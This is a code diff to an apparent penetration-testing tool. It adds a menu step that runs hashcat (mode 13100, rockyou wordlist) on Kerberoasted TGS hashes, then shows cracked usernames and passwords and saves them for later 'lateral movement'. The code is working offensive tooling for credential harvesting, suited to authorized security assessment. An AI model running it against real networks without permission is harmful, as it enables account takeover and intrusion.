@@ -1318,6 +1318,94 @@ def _phase2_exploitation_menu(state: AssessmentState) -> None:
             _display_kerb_results(result)
             save_session(state)
 
+            # ── Offer inline hashcat for TGS hashes ───────────────────
+            if result.get("hashes") and result.get("hash_file"):
+                console.print()
+                _crack_now = Prompt.ask(
+                    "  [bold yellow]Crack TGS hashes now with hashcat?[/bold yellow]",
+                    choices=["yes", "no"], default="no",
+                )
+                if _crack_now == "yes":
+                    _hf  = result["hash_file"]
+                    _wl  = "/usr/share/wordlists/rockyou.txt"
+                    _cmd = ["hashcat", "-m", "13100", _hf, _wl, "--force"]
+                    console.print()
+                    if not os.path.isfile(_wl):
+                        console.print(f"  [red]Wordlist not found: {_wl}[/red]")
+                    else:
+                        import subprocess as _sp2
+                        import time as _time2
+                        from rich.progress import (
+                            Progress as _Prog2,
+                            SpinnerColumn as _SC2,
+                            TextColumn as _TC2,
+                            TimeElapsedColumn as _TEC2,
+                        )
+                        _timed_out2 = False
+                        _proc2 = None
+                        try:
+                            _proc2 = _sp2.Popen(
+                                _cmd,
+                                stdout=_sp2.DEVNULL,
+                                stderr=_sp2.DEVNULL,
+                            )
+                            _n2 = len(result["hashes"])
+                            with _Prog2(
+                                _SC2(style="bold cyan"),
+                                _TC2(
+                                    f"  [bold cyan]Cracking {_n2} TGS ticket(s) — "
+                                    "rockyou.txt[/bold cyan]"
+                                ),
+                                _TEC2(),
+                                console=console,
+                                transient=True,
+                            ) as _prog2:
+                                _prog2.add_task("", total=None)
+                                _deadline2 = _time2.monotonic() + 900
+                                while _proc2.poll() is None:
+                                    if _time2.monotonic() > _deadline2:
+                                        _proc2.terminate()
+                                        _timed_out2 = True
+                                        break
+                                    _time2.sleep(0.5)
+                        except FileNotFoundError:
+                            console.print(
+                                "  [red]hashcat not found. "
+                                "Install: sudo apt install hashcat[/red]"
+                            )
+                            _proc2 = None
+
+                        if _timed_out2:
+                            console.print("  [yellow]⚠  hashcat timed out after 15 min.[/yellow]")
+
+                        if _proc2 is not None:
+                            _new2 = _resolve_cracked_passwords(state)
+                            if _new2:
+                                save_session(state)
+                                _rt2 = Table(
+                                    title="[bold green]✔  Cracked TGS Passwords[/bold green]",
+                                    box=box.ROUNDED,
+                                    border_style="green",
+                                    show_lines=True,
+                                    expand=False,
+                                )
+                                _rt2.add_column("Username", style="bold yellow", width=28)
+                                _rt2.add_column("Password", style="bold white",  width=24)
+                                for _u2, _pw2 in _new2.items():
+                                    _rt2.add_row(_u2, _pw2)
+                                console.print()
+                                console.print(_rt2)
+                                console.print()
+                                console.print(
+                                    "  [bold bright_cyan]→ Credentials saved to session — "
+                                    "use in Phase 3 for lateral movement.[/bold bright_cyan]"
+                                )
+                            else:
+                                console.print(
+                                    "  [yellow]⚠  No TGS hashes cracked — "
+                                    "try a different wordlist or add rules.[/yellow]"
+                                )
+                    console.print()
 
         elif choice == "3":
             passwords = Prompt.ask(
